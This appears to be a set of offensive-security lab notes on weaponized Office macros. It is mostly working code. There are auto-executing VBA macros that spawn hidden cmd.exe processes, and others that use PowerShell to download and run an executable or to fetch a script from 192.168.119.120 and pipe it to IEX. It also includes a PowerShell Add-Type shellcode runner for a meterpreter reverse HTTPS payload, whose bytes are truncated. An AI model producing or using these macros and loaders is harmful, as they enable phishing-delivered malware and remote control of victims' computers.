**Using cmd.exe and using the VBA Shell function:**

Macro example:

```
Sub Document_Open()
  MyMacro
End Sub

Sub AutoOpen()
  MyMacro
End Sub

Sub MyMacro()
  Dim str As String
  str = "cmd.exe"
  Shell str, vbHide
End Sub
```

**Using Windows Script Host(WSH) to launch a cmd.exe:**

Macro example:

```
Sub Document_Open()
  MyMacro
End Sub

Sub AutoOpen()
  MyMacro
End Sub

Sub MyMacro()
  Dim str As String
  str = "cmd.exe"
  CreateObject("Wscript.Shell").Run str, 0
End Sub
```

**Let powershell help us:**

Downloading an executable, writing it to disk and then exectuting it(take into acount PowerShell Constrained Language Mode):

```
Sub Document_Open()
  MyMacro
End Sub

Sub AutoOpen()
  MyMacro
End Sub
Sub MyMacro()
  Dim str As String
  str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 'msfstaged.exe')"
  Shell str, vbHide
  Dim exePath As String
  exePath = ActiveDocument.Path + "\msfstaged.exe"
  Wait (2)
  Shell exePath, vbHide
End Sub

Sub Wait(n As Long)
  Dim t As Date
  t = Now
  Do
    DoEvents
  Loop Until Now >= DateAdd("s", n, t)
End Sub
```
(note that in this script we also added a time delay, since the download time of our executable may vary)

Powershell shellcode runner using the Add-Type compilation method:

Take this PowerShell Script(save it as run.ps1), and then serve it through an HTTP server on port 80.

```
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
      [DllImport("kernel32")]
      public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

      [DllImport("kernel32", CharSet=CharSet.Ansi)]
      public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

      [DllImport("kernel32.dll", SetLastError=true)]
      public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
}

"@

Add-Type $Kernel32

#msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=443 EXITFUNC=thread -f ps1
[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60...

$size = $buf.Length

[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)

$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);

[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
```

Macro to trigger the execution of our PowerShell shellcode runner:

```
Sub MyMacro()
  Dim str As String
  str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.ps1') | IEX"
  Shell str, vbHide
End Sub

Sub Document_Open()
  MyMacro
End Sub

Sub AutoOpen()
  MyMacro
End Sub
```

